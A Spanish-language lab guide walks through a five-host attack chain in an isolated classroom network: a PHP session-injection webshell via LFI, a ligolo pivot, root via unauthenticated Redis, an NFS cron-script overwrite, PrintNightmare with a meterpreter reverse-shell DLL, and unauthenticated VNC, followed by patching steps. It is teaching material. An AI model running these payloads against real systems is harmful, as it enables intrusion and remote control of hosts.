# Guía de explotación · Lab PHP2Shell

> Cadena: **M6 → M1 (PHP2Shell) → [pivote] → M2 (Redis) → M3 (NFS) → M5 (VNC)**.
> M4 (PrintNightmare) es un salto **opcional** y usa la cuenta limitada `soporte`
> como precondición.
> Cada salto es una vulnerabilidad; 1, 2, 3 y 5 no usan credenciales.
> Solo red aislada `10.10.10.0/24`, VM propias y autorización del docente.

---

## 0. Antes de empezar

| Necesitas | Detalle |
|---|---|
| M6 arriba | Kali `10.10.10.20`, sirve repo y artefactos en `:8000` |
| VMs arriba | M1–M5 encendidas y con su snapshot `00-base` |
| Snapshots | `00-base` de cada VM antes de tocar nada |
| Artefactos | `artifacts/` con SHA256 (los instala M6) |
| Herramientas | `nmap`, `redis-cli`, `ssh`, `smbclient`, `msfvenom`/`msfconsole`, `vncviewer`, `ligolo-proxy` |
| Tiempo | ~30 min de instalación (M1 compila Apache y PHP) |

Convención de evidencias: `EV-<salto>-NN.png` + `LOG-<salto>-NN.txt` + SHA256, hora UTC.

### 0.1 Gate de arranque

No se empieza un salto si esto falla. Desde M6:

```bash
# 1) las cinco VM responden
for h in 11 12 13 14 15; do
  ping -c1 -W1 "10.10.10.$h" >/dev/null 2>&1 \
    && echo "10.10.10.$h UP" \
    || echo "10.10.10.$h DOWN"
done

# 2) M6 sirve el repo
curl -fsSI http://10.10.10.20:8000/lab.tar.gz >/dev/null && echo "repo :8000 OK"

# 3) DNS partido (uni.lab -> M4)
getent hosts wp.uni.lab

# 4) herramientas mínimas
for c in nmap redis-cli ssh smbclient msfconsole vncviewer ligolo-proxy; do
  command -v "$c" >/dev/null 2>&1 && echo "$c OK" || echo "$c FALTA"
done
```

Si algo está `DOWN` o `FALTA`, se resuelve antes de continuar; no se documenta
un salto ejecutado sobre un entorno incompleto.

### 0.2 Trazabilidad: de dónde sale cada comando

Todos los comandos de esta guía están implementados en el repo. Si algo cambia,
se cambia en el script y la guía debe seguirlo.

| Comando de la guía | Dónde está implementado |
|---|---|
| `bootstrap.sh` / `bootstrap.ps1` | `lab/bootstrap.sh`, `lab/bootstrap.ps1` |
| `lab/session.php` y `dl.php` | `lab/m1/app/lab/session.php`, `lab/m1/app/legacy-download/` |
| `session.save_path=/tmp`, `cleanup=Off` | `lab/m1/conf/php-lab.ini` |
| 7 niveles `../../../../../../../tmp/sess_` | `dl.php` incluye desde `legacy-download/templates/` |
| `redis-cli ... CONFIG SET` | `lab/m2/install.sh` (Redis `User=root`, sin `requirepass`) |
| `mount -t nfs` + `rotate.sh` | `lab/m3/install.sh` (`no_root_squash`, `/etc/cron.d/lab-rotate`) |
| `01b-pivot.sh` (ligolo, rutas /32) | `lab/chain/01b-pivot.sh` |
| `ligolo-proxy` (binario `proxy`) | `artifacts/pocs/ligolo-ng_proxy_0.9.2_linux_amd64.tar.gz` |
| `printnightmare` | `lab/m4/install.ps1` (Spooler + `soporte`) + `lab/chain/04` |
| `vnc-info` / `vncviewer` | `lab/m5/install.ps1` (`UseVncAuthentication=0`, 5900) |
| Ejecución por pasos | `lab/chain/01-m1-php2shell.sh` … `05-m4-to-m5.sh` |

### 0.3 Mapeo de la red

Antes de explotar se confirma qué hay y qué servicio expone cada host. En la
demo no se usa `nmap -p-` (solo en bitácora interna).

```bash
# hosts vivos
nmap -sn 10.10.10.0/24

# servicios del escenario
nmap -Pn -sT -p 21,22,53,135,139,443,445,2049,3306,3389,5900,5985,6379,8000 \
  10.10.10.11-15
```

Esperado: M1 443; M2 3306/6379; M3 21/2049; M4 53/445/5985; M5 445/3389/5900.

El mapeo justifica dos decisiones de esta guía:

1. M5 expone `5900` sin autenticación y es alcanzable desde M6, así que **no
   depende de M4**.
2. M4 y M5 comparten L2 con M6; las rutas `/32` del pivote para `.14` y `.15`
   deben omitirse, porque fuerzan el tráfico por el túnel y rompen las
   conexiones inversas (callback de PrintNightmare, VNC).

---

## 1. Instalación (una vez)

### 1.1 M6: servidor de despliegue

```bash
cd /ruta/al/repo
sudo bash lab/m6/install.sh
# deja /srv/lab, /srv/lab.tar.gz y sirve en :8000
```

Si no queda sirviendo: `bash lab/m6/serve.sh`.

El tar de ligolo trae el binario como `proxy`, pero la cadena lo busca como
`ligolo-proxy`. Hay que dejarlo con ese nombre:

```bash
cd /ruta/al/repo
tar xzf artifacts/pocs/ligolo-ng_proxy_0.9.2_linux_amd64.tar.gz -C /tmp
sudo install -m 755 /tmp/proxy /usr/local/bin/ligolo-proxy
ligolo-proxy -h | head -n 3
```

### 1.2 Orden de instalación

```
M6 → M3 → M2 → M1 → M4 → M5
```

M3 antes que M2 para que M2 pueda copiar su llave de administración; M1 al final
porque necesita M2 (base de datos) y M3 (NFS).

En cada VM Ubuntu, desde su consola:

```bash
curl -fsSL http://10.10.10.20:8000/bootstrap.sh | sudo bash -s m3   # o m2, m1
```

En cada Windows (consola elevada):

```powershell
iwr http://10.10.10.20:8000/bootstrap.ps1 -UseBasicParsing -OutFile $env:TEMP\bootstrap.ps1
powershell -NoProfile -ExecutionPolicy Bypass -File $env:TEMP\bootstrap.ps1 -Role m4
# o -Role m5. El instalador queda en C:\lab\lab\m4\install.ps1
```

### 1.3 Verificación

```bash
# en M6
bash lab/chain/00-preflight.sh --full   # FAIL=0 antes de la demo
bash lab/tests/smoke.sh

# en cada VM, tras instalar (la ruta depende de dónde se extrajo el paquete)
bash /opt/lab/lab/m1/verify.sh 2>/dev/null || bash /opt/lab/m1/verify.sh
```

`smoke.sh` debe dar PASS en 443 (M1), 3306/6379 (M2), 21/2049 (M3),
53/445/5985 (M4), 445/3389/5900 (M5) y resolver `wp.uni.lab` por el DNS de M4.

---

## 2. Salto 1 · M6 → M1 · PHP2Shell

**Objetivo:** `www-data` en M1.
**Vulnerabilidad:** `session.upload_progress` + sink LFI del plugin `legacy-download`.

> **Importante:** PHP2Shell da **`www-data`, no `root`**. Y no hace falta root en M1:
> el salto 2 ataca Redis en M2 por red. Si en la réplica alguien espera `uid=0`
> aquí, la respuesta es: "el primer salto da el usuario del servicio web; root
> llega en M2".

### 2.1 Comprobación previa

```bash
curl -k -s -o /dev/null -w '%{http_code}\n' https://wp.uni.lab/
curl -k -s -o /dev/null -w '%{http_code}\n' https://wp.uni.lab/lab/session.php
curl -k -s 'https://wp.uni.lab/wp-content/plugins/legacy-download/dl.php?file=default.php'
```

Los tres deben responder `200`.

### 2.2 Explotación manual

```bash
SID="lab$(date +%s)"
head -c 8388608 /dev/zero > /tmp/u.bin

# 1) sembrar la sesión: el nombre del campo va al archivo de sesión.
#    Se sube despacio y se corta a los 4 s: el archivo ya quedó escrito y no
#    se compite por el worker de Apache prefork (cleanup=Off lo conserva).
curl -sk --max-time 180 --limit-rate 128k -b "PHPSESSID=$SID" \
  --form-string 'PHP_SESSION_UPLOAD_PROGRESS=<?php echo "PWN"; system($_GET["c"]); ?>' \
  -F 'payload=@/tmp/u.bin;filename=payload.bin' \
  https://wp.uni.lab/lab/session.php -o /dev/null &
PID=$!

sleep 4
kill "$PID" 2>/dev/null || true
wait "$PID" 2>/dev/null || true

# 2) incluir el archivo de sesión por el LFI (7 niveles hasta /)
curl -sk -G 'https://wp.uni.lab/wp-content/plugins/legacy-download/dl.php' \
  --data-urlencode "file=../../../../../../../tmp/sess_$SID" \
  --data-urlencode 'c=id'
```

Esperado:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Si responde, guarda el SID y sigue con ese canal para comandos:

```bash
printf 'WS_SID=%s\nLFI_URL=%s\n' "$SID" \
  'https://wp.uni.lab/wp-content/plugins/legacy-download/dl.php' \
  > /tmp/lab-chain.env
chmod 600 /tmp/lab-chain.env

# atajo para el resto de la guía
. /tmp/lab-chain.env
m1() {
  curl -sk -G "$LFI_URL" \
    --data-urlencode "file=../../../../../../../tmp/sess_$WS_SID" \
    --data-urlencode "c=$1"
}

m1 'id; hostname'
m1 'cat /var/www/wp/wp-config.php'
```

### 2.3 Automático

```bash
bash lab/chain/01-m1-php2shell.sh --run
# guarda $WS_SID en /tmp/lab-chain.env
```

### 2.4 `entry-a` (opcional, time-box)

El CVE puro. Se intenta y se documenta; **no se declara RCE sin `id`**:

```bash
bash lab/chain/01-m1-php2shell.sh --run --entry a --timebox 600
```

---

## 3. Salto 1.5 · M1 como puerta · pivote ligolo-ng

**Objetivo:** que el tráfico de M6 hacia M2 y M3 salga por M1 (M4 y M5 van
directos por L2).
**Por qué:** M6 solo alcanza `10.10.10.11` directamente; Redis y NFS no deben
ser accesibles desde la red del atacante.

### 3.1 Qué monta

- Un **agente** ligolo corriendo en M1 como `www-data`, que conecta *hacia*
  M6:11601 (salida, no entrada).
- Un **proxy** en M6 que crea la interfaz `lab` y las rutas `/32` a `.12` y `.13`.
- M6 conserva la ruta directa a `.11` (443 y agente). M4 y M5 están en el mismo
  L2 que M6: sus rutas deben ser directas por `eth1`, no por `lab`; si se fuerzan
  por el túnel, se rompen las conexiones inversas (callback de PrintNightmare).

### 3.2 Configuración manual

En ligolo-ng 0.9.2 **el id del agente es su MAC** y el binario `agent` ya no
tiene `-id`. El id debe coincidir con la clave del bloque `agent:` del YAML.

```bash
. /tmp/lab-chain.env
# si abriste una consola nueva, redefine el atajo
m1() {
  curl -sk -G "$LFI_URL" \
    --data-urlencode "file=../../../../../../../tmp/sess_$WS_SID" \
    --data-urlencode "c=$1"
}

# id real del agente: MAC de la interfaz de M1.
# El sink imprime "upload_progress_PWN" y la cola serializada alrededor del
# comando, así que se extrae solo el patrón MAC.
MAC="$(m1 'cat /sys/class/net/*/address 2>/dev/null | head -1' \
  | grep -oE '([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}' | head -1 \
  | tr -d ':' | tr 'A-Z' 'a-z')"
echo "id del agente: $MAC"

mkdir -p ~/lab-work
cat > ~/lab-work/ligolo.yaml <<EOF
agent:
    "$MAC":
        autobind: true
        interface: lab
interface:
    lab:
        routes:
            - 10.10.10.12/32
            - 10.10.10.13/32
web:
    enabled: false
EOF
```

Proxy en M6 (consola aparte, queda en primer plano):

```bash
sudo ligolo-proxy -selfcert -laddr 0.0.0.0:11601 -config ~/lab-work/ligolo.yaml
```

Agente en M1, subido y ejecutado por el sink LFI (sin `-id`):

```bash
m1 'cd /tmp && curl -fsS http://10.10.10.20:8000/artifacts/pocs/ligolo-ng_agent_0.9.2_linux_amd64.tar.gz -o a.tgz && tar xzf a.tgz && chmod +x agent && (setsid nohup ./agent -connect 10.10.10.20:11601 -ignore-cert -retry >/tmp/agent.log 2>&1 &) && echo started'
```

Con `autobind: true` y la clave correcta, el proxy arranca el túnel solo; en su
log debe verse `Agent joined. id=<MAC>` y `Starting autobind session`. Solo si
el id no coincidiera hay que entrar a la consola del proxy:

```text
session
tunnel_start
```

### 3.3 Verificación

```bash
ip -brief addr show lab
for h in 12 13; do ip route get "10.10.10.$h" | head -1; done   # dev lab
for h in 14 15; do ip route get "10.10.10.$h" | head -1; done   # dev eth1
# M2/M3 por el túnel; M4/M5 directos
```

Criterio de aceptación:

```bash
ip route get 10.10.10.12 | grep -q 'dev lab' && echo "pivote OK" || echo "pivote NO"
ip route get 10.10.10.14 | grep -q 'dev eth1' && echo "M4 directo OK" || echo "M4 NO directo"
```

> **Regla de secuencia:** a partir de aquí, §4–§7 se ejecutan **en M6 con el
> túnel activo**. Antes de cada salto se repite el chequeo de la ruta. Si la
> ruta no dice `dev lab`, ese salto no es válido aunque el comando "funcione":
> estaría yendo directo y la cadena no sería real.

### 3.4 Automático

```bash
bash lab/chain/01b-pivot.sh --run     # config + proxy + agente
bash lab/chain/01b-pivot.sh --check   # M2/M3 por lab; M4/M5 directos
```

El script deriva la MAC de M1 con `grep -oE`, escribe `~/lab-work/ligolo.yaml`
con esa clave y ya no pasa `-id` (corregido para 0.9.2). Solo enruta M2 y M3;
M4 y M5 se verifican directos. Si el proxy ya estaba corriendo con la config
vieja, reinícialo para que no reañada las rutas de `.14`/`.15`. Si el agente no
aparece, usar §3.2 manual y continuar con `--check`.

### 3.5 Si falla

| Síntoma | Causa probable | Solución |
|---|---|---|
| `ligolo-proxy: command not found` | binario aún se llama `proxy` | §1.1: `install -m755 /tmp/proxy /usr/local/bin/ligolo-proxy` |
| `flag provided but not defined: -id` | ligolo 0.9.2 eliminó `-id` | lanzar el agente sin `-id` (§3.2); el id lo toma de la MAC |
| El proxy arranca pero no hay sesión | M1 no alcanza M6:11601 | `m1 'cat /tmp/agent.log'`; revisar regla de salida en M1 |
| Hay sesión pero no autobind | la clave del YAML no es la MAC del agente | comparar `id=` del log del proxy con la clave en `ligolo.yaml` |
| Hay ruta `lab` pero no hay conectividad | M1 no enruta a M2/M3 | `m1 'ip route get 10.10.10.12'` |
| `--check` marca NO | túnel caído o id distinto | revisar `~/lab-work/ligolo-proxy.log` y repetir §3.2 |

---

## 4. Salto 2 · M1 → M2 · Redis sin autenticación

**Objetivo:** `root` en M2.
**Vulnerabilidad:** Redis 6.2.6 en `0.0.0.0:6379` sin `requirepass` y corriendo
como root. `CONFIG SET dir/dbfilename` + `SAVE` escribe un archivo arbitrario.

> Se ejecuta **desde M6 con el pivote activo** (§3).

### 4.1 Comprobación

```bash
ip route get 10.10.10.12 | grep -q 'dev lab' || echo "PIVOTE NO ACTIVO"

redis-cli -h 10.10.10.12 --no-auth-warning PING
# PONG
redis-cli -h 10.10.10.12 --no-auth-warning CONFIG GET dir
```

### 4.2 Explotación manual

```bash
mkdir -p ~/lab-work && chmod 700 ~/lab-work
ssh-keygen -t ed25519 -N '' -C 'lab-chain' -f ~/lab-work/id_lab

redis-cli -h 10.10.10.12 --no-auth-warning CONFIG SET dir /root/.ssh
redis-cli -h 10.10.10.12 --no-auth-warning CONFIG SET dbfilename authorized_keys
printf '\n\n%s\n\n' "$(cat ~/lab-work/id_lab.pub)" | \
  redis-cli -h 10.10.10.12 --no-auth-warning -x SET lab_pwn
redis-cli -h 10.10.10.12 --no-auth-warning SAVE

ssh -i ~/lab-work/id_lab -o StrictHostKeyChecking=no \
  root@10.10.10.12 'id; hostname'
```

Esperado: `uid=0(root) gid=0(root)`.

### 4.3 Automático

```bash
bash lab/chain/02-m1-to-m2.sh --run
```

### 4.4 Si falla

- `CONFIG SET` responde error → Redis no es root o `protected-mode` está en `yes`.
- `PONG` pero la llave no entra → `/root/.ssh` no existe o sshd no acepta llaves
  de root. Comprueba en M2: `ls -ld /root/.ssh`, `sshd -T | grep permitrootlogin`.
- Sin `PONG` → revisar el pivote (§3.3) antes de tocar Redis.

---

## 5. Salto 3 · M2 → M3 · NFS `no_root_squash` + cron root

**Objetivo:** `root` en M3.
**Vulnerabilidad:** `/srv/storage/backups` se exporta con `no_root_squash` y el
root de M3 ejecuta cada minuto `rotate.sh` desde ese directorio. El root del
cliente NFS (M2) sobrescribe el script.

> Se ejecuta **desde M6 con el pivote activo**; el montaje y la escritura ocurren
> dentro de M2 por SSH.

### 5.1 Comprobación (desde M2 como root)

```bash
ssh -i ~/lab-work/id_lab -o StrictHostKeyChecking=no root@10.10.10.12

# ya dentro de M2
mkdir -p /mnt/bkp
mount -t nfs 10.10.10.13:/srv/storage/backups /mnt/bkp
findmnt -no SOURCE,OPTIONS /mnt/bkp
ls -l /mnt/bkp/rotate.sh
```

Debe verse `no_root_squash` en las opciones del export.

### 5.2 Explotación manual (payload desde M6, escritura en M2)

```bash
PUB="$(cat ~/lab-work/id_lab.pub)"
echo "$PUB"   # comprobar que NO quedó ningún placeholder

ssh -i ~/lab-work/id_lab -o StrictHostKeyChecking=no root@10.10.10.12 \
  "cat > /mnt/bkp/rotate.sh && chmod 755 /mnt/bkp/rotate.sh" <<EOF
#!/bin/sh
# lab: lo ejecuta el cron root de M3 cada minuto
mkdir -p /root/.ssh
grep -qF '$PUB' /root/.ssh/authorized_keys 2>/dev/null || \
  printf '%s\n' '$PUB' >> /root/.ssh/authorized_keys
chmod 700 /root/.ssh 2>/dev/null
chmod 600 /root/.ssh/authorized_keys 2>/dev/null
id > /root/PWNED-M3.txt
hostname >> /root/PWNED-M3.txt
date -u >> /root/PWNED-M3.txt
EOF
```

Espera al cron (≤ 60 s) y entra:

```bash
ssh -i ~/lab-work/id_lab -o StrictHostKeyChecking=no \
  root@10.10.10.13 'id; cat /root/PWNED-M3.txt'
```

### 5.3 Automático

```bash
bash lab/chain/03-m2-to-m3.sh --run
```

### 5.4 Si falla

- `mount` cuelga o da `access denied` → UFW de M3 no permite 2049 desde M2.
- El cron no corre → `systemctl status cron`, `cat /etc/cron.d/lab-rotate`.
- El archivo no cambia → el export no tiene `no_root_squash` (`exportfs -v`).
- La llave no entra → comprobar que `rotate.sh` contiene la clave real y no
  `AAAA...TU_CLAVE...`; volver a ejecutar §5.2.

---

## 6. Salto 4 (opcional) · M3 → M4 · PrintNightmare (CVE-2021-34527)

**Objetivo:** `SYSTEM` en M4.
**Vulnerabilidad:** el spooler de impresión carga una DLL desde una ruta de red
con la cuenta limitada `soporte`.

> **Opcional:** este salto **no es requisito** para llegar a M5. Usa
> `soporte` / `UniLab2026!` como precondición: no es una credencial obtenida por
> explotación, pero es una credencial y se declara como tal. Si se omite, la
> cadena operativa es M1 → M2 → M3 → M5.

> MS17-010 (EternalBlue) **no se usa por defecto**: el módulo de Metasploit no
> soporta Windows Server 2016 build 14393 (`This exploit does not support this
> build`). Solo vale si M4 es Server 2012 R2; para eso está `--eternalblue`.

### 6.1 Comprobación

```bash
ip route get 10.10.10.14 | grep -q 'dev lab' || echo "PIVOTE NO ACTIVO"
nmap -Pn -p445,135,139 10.10.10.14
```

### 6.2 Explotación manual (Metasploit)

```bash
WORK="$HOME/lab-work"
mkdir -p "$WORK"
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.20 LPORT=4444 \
  -f dll -o "$WORK/pn.dll"
echo "$WORK/pn.dll"    # esta ruta exacta se usa en `set DLL`
msfconsole -q
```

```text
use exploit/windows/dcerpc/cve_2021_1675_printnightmare
set RHOSTS 10.10.10.14
set SMBUser soporte
set SMBPass UniLab2026!
set SRVHOST 10.10.10.20
set DLL /home/kali/lab-work/pn.dll
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.10.20
set LPORT 4444
set ExitOnSession false
run
```

`set DLL` debe ser la ruta que imprimió `echo` (arriba se muestra la de un Kali
con `$HOME=/home/kali`). En el meterpreter:

```text
getuid
# NT AUTHORITY\SYSTEM
```

Si el módulo no aparece: `search printnightmare` y usa la ruta que devuelva.

### 6.3 Automático

```bash
bash lab/chain/04-m3-to-m4.sh --run            # PrintNightmare
bash lab/chain/04-m3-to-m4.sh --eternalblue --run   # solo Server 2012 R2
```

El script genera la DLL, lanza el módulo y lee `C:\Transfer\PWNED-M4.txt` por
SMB anónimo (`Transfer` es Everyone y el SMB anónimo está habilitado a propósito).
Esperado: `nt authority\system`.

### 6.4 Si falla

- El módulo no existe → `search printnightmare` y ajusta `04`.
- El spooler está parado → `Get-Service Spooler` en M4 y arráncalo.
- La cuenta `soporte` no existe → reejecuta `m4/install.ps1`.
- Si M4 fuera Server 2012 R2, usa `--eternalblue`.
- `set DLL` con una ruta inexistente → repetir `echo "$WORK/pn.dll"` y corregir.

---

## 7. Salto 5 · M5 · VNC sin autenticación (independiente de M4)

**Objetivo:** escritorio de M5 y su bandera.
**Vulnerabilidad:** TightVNC 2.8.90 con `UseVncAuthentication=0` (CWE-306).

> **No requiere M4:** el `5900` está expuesto y sin autenticación; se llega
> desde M6. El salto 4 es opcional y no condiciona este paso.

### 7.1 Comprobación

```bash
nmap -Pn -p5900 --script vnc-info 10.10.10.15
```

Esperado: `Authentication: None`.

### 7.2 Acceso interactivo

```bash
vncviewer 10.10.10.15
```

Sin contraseña. La bandera está en `C:\Compartido\flag-M5.txt`.

### 7.3 Evidencia sin GUI (canal independiente)

`vncdotool` no viene instalado y no se descarga (regla de laboratorio aislado).
La evidencia no interactiva se obtiene así:

```bash
# 1) el servicio no pide autenticación
nmap -Pn -p5900 --script vnc-info 10.10.10.15 | tee /tmp/vnc-info.txt

# 2) la bandera, por SMB anónimo (share Everyone)
smbclient //10.10.10.15/Compartido -N -c 'get flag-M5.txt'
cat flag-M5.txt
```

> Si el SMB anónimo está denegado en el snapshot (`NT_STATUS_ACCESS_DENIED`),
> la bandera se lee con la cuenta de laboratorio de M5 (`cliente`). El acceso
> VNC sigue siendo sin autenticación: esa es la evidencia del salto.

Con GUI, la captura del escritorio (`EV-05`) se toma con `vncviewer`. Si
`vncdotool` estuviera disponible en el medio local, `vncdotool -s 10.10.10.15
capture /tmp/m5-flag.png` es un extra, nunca un requisito.

### 7.4 Automático

```bash
bash lab/chain/05-m4-to-m5.sh --run
```

---

## 8. Demo completa (orden de la sustentación)

```bash
# 0. comprobar que todo está en su sitio (FAIL=0)
bash lab/chain/00-preflight.sh --full

# 1. entrada
bash lab/chain/01-m1-php2shell.sh --run        # uid=33(www-data)

# 1.5 pivote: M1 pasa a ser la puerta hacia M2 y M3
bash lab/chain/01b-pivot.sh --run
bash lab/chain/01b-pivot.sh --check            # M2-M3 por la interfaz lab
ip route get 10.10.10.12 | grep 'dev lab'      # criterio de aceptación
# M4 y M5 comparten L2 con M6: sus rutas deben ser directas (dev eth1),
# no por `lab`, o se rompe el callback de PrintNightmare.

# 2. Redis -> root M2
bash lab/chain/02-m1-to-m2.sh --run            # uid=0(root)

# 3. NFS + cron -> root M3
bash lab/chain/03-m2-to-m3.sh --run            # uid=0(root) + PWNED-M3.txt

# 4 (opcional). PrintNightmare -> SYSTEM M4
#    requiere soporte / UniLab2026!; no es requisito para M5
bash lab/chain/04-m3-to-m4.sh --run            # nt authority\system

# 5. VNC -> M5 (no depende del paso 4)
bash lab/chain/05-m4-to-m5.sh --run            # captura + flag
```

En la demo se muestra primero el comando manual y después el `--run` como
contraste: el script debe reproducir exactamente lo que se acaba de explicar.

Guarda por salto: comando, salida, captura y `sha256sum`.

---

## 9. Evidencias mínimas por salto

| Salto | Evidencia | Qué debe verse |
|---|---|---|
| 1 | `EV-01` + `LOG-01` | `uid=33(www-data)` y la URL del sink |
| 2 | `EV-02` | `PONG`, `CONFIG SET`, `uid=0(root)` en M2 |
| 3 | `EV-03` | `no_root_squash`, `rotate.sh`, `uid=0(root)` en M3 |
| 4 (opcional) | `EV-04` | `getuid` = `NT AUTHORITY\SYSTEM` y `PWNED-M4.txt` |
| 5 | `EV-05` | `Authentication: None` y captura del escritorio |

### 9.1 Cómo capturarlas

Un directorio por corrida, con hora UTC y hash al final:

```bash
TS="$(date -u +%Y%m%dT%H%M%SZ)"
OUT="evidence/$TS"
mkdir -p "$OUT"

# cada salto: comando + salida completa
bash lab/chain/01-m1-php2shell.sh --run 2>&1 | tee "$OUT/LOG-01-01.txt"

# capturas: EV-<salto>-NN.png (pantalla del comando o de vncviewer)
# y al cerrar cada salto:
sha256sum "$OUT"/* | tee "$OUT/SHA256SUMS"
```

Reglas:

1. El `LOG` se genera con `tee`, no se edita a mano.
2. La captura va aparte (`EV-*`) y muestra el comando y su salida en pantalla.
3. El marcador (`PWNED-M3.txt`, `PWNED-M4.txt`, `flag-M5.txt`) se recupera por
   un canal distinto al del exploit.
4. `sha256sum` se calcula al final y se guarda en `SHA256SUMS`.

---

## 10. Problemas típicos

| Síntoma | Causa probable | Solución |
|---|---|---|
| 443 no responde | Apache/nginx caídos | `systemctl status apache-lab nginx`; `bash m1/verify.sh` |
| `dl.php` da 404 | plugin no activo | activar `legacy-download` en wp-admin |
| LFI no ejecuta | `session.upload_progress.cleanup=On` | debe estar `Off`; revisar `php -i` |
| No aparece `/tmp/sess_*` | `save_path` distinto | `php -i \| grep save_path` (debe ser `/tmp`) |
| `ligolo-proxy: not found` | el tar trae `proxy` | §1.1: renombrar a `/usr/local/bin/ligolo-proxy` |
| Agente muere por `-id` | ligolo 0.9.2 eliminó esa bandera | lanzarlo sin `-id`; el id es la MAC |
| Pivote sin rutas | id del YAML ≠ MAC del agente | comparar `id=` del log con la clave de `ligolo.yaml` |
| M2/M3 no responden tras el pivote | túnel caído | `01b-pivot.sh --check`; revisar `~/lab-work/ligolo-proxy.log` |
| Redis `PONG` pero sin llave | Redis no root o `/root/.ssh` ausente | `ps -o user= -C redis-server`; crear `/root/.ssh` |
| `mount` NFS falla | 2049 cerrado desde M2 | `ufw allow from 10.10.10.12 to any port 2049` en M3 |
| PrintNightmare falla | módulo/spooler | `search printnightmare`; comprobar Spooler |
| VNC no responde | `tvnserver` caído o 5900 filtrado | `Get-Service tvnserver`; regla de firewall |
| Falta `vncdotool` | no está en M6 y no se descarga | usar §7.3 (nmap + SMB) y `vncviewer` para la captura |

---

## 11. Límites que debes declarar

1. **`entry-b` no es el UAF** de CVE-2026-109618: es session injection + LFI.
   El UAF puro (`entry-a`) sigue sin PoC público fiable.
2. **Redis como root** es una misconfiguración intencional, no un CVE.
   Si se exige CVE, la alternativa es CVE-2022-0543 (paquete Debian de Redis).
3. **PrintNightmare usa la cuenta limitada `soporte`** (precondición, no
   vulnerabilidad). Es el único salto con credencial y es **opcional**.
4. **El pivote es real** con `01b-pivot.sh` (ligolo-ng) para M2 y M3; M4 y M5
   están en el mismo L2 que M6 y deben ir por `eth1`, no por `lab`.
5. **VNC sin auth** da escritorio, no shell; la evidencia es `Authentication: None`
   más la bandera leída por SMB, no un `id`.
6. **M5 no depende de M4:** el VNC está expuesto y sin autenticación; la cadena
   operativa es M1 → M2 → M3 → M5. El salto 4 se declara como opcional.

---

## 12. Volver al estado parcheado

Restaurar el snapshot `estado-inicial` y ejecutar los scripts de `lab/patch/`:

```bash
# en cada VM, tras restaurar el snapshot
sudo bash /opt/lab/lab/patch/m1-php.sh     # M1: PHP 8.4.27 + upload_progress Off + sink fuera
sudo bash /opt/lab/lab/patch/m2-redis.sh   # M2: Redis 6.2.7 + requirepass + loopback + sin root
sudo bash /opt/lab/lab/patch/m3-nfs.sh     # M3: root_squash + cron fuera
# Windows (consola elevada)
powershell -NoProfile -ExecutionPolicy Bypass -File C:\lab\lab\patch\m4.ps1
powershell -NoProfile -ExecutionPolicy Bypass -File C:\lab\lab\patch\m5.ps1

# desde M6: los saltos deben fallar (incluido el opcional M4)
bash lab/patch/retest.sh
```

| VM | Parche |
|---|---|
| M1 | PHP 8.4.27 + `session.upload_progress.enabled=Off` + plugin/harness eliminados |
| M2 | Redis 6.2.7 + `requirepass` + `bind 127.0.0.1` + usuario `redis` |
| M3 | `root_squash` + cron y `rotate.sh` eliminados |
| M4 | SMB1 off + Spooler detenido + SMB anónimo off |
| M5 | VNC loopback + auth + RDP NLA + SMB anónimo off |

Después, repetir los mismos comandos: deben fallar. Guardar `LOG-PATCH-*` y
tomar el snapshot `estado-parcheado`.
